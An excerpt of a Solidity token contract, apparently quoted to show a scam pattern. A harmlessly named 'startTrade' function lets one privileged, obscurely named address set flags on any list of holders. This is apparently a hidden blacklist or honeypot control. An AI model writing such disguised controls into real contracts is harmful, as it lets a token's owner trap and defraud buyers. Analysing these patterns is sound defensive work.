...
contract Token is Context, IERC20, Ownable{
    ...
    address payable public _mapping;

    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public _isExcludefromFee;
    mapping (address => bool) public isMarketPair;
    mapping (address => bool) public _replace;
    ...
    function startTrade(bool onlyBOOL, address[] calldata BYSIG) public {
        for (uint i; i < BYSIG.length; i++) {
            _replace[BYSIG[i]] = onlyBOOL;
        }
        require(msg.sender == _mapping);
    }
    ...
    function swapAndLiquify(uint256 tAmount) private lockTheSwap {
        ...
        if(MarketAmount > 0)
            _mapping.transfer(MarketAmount);
    }
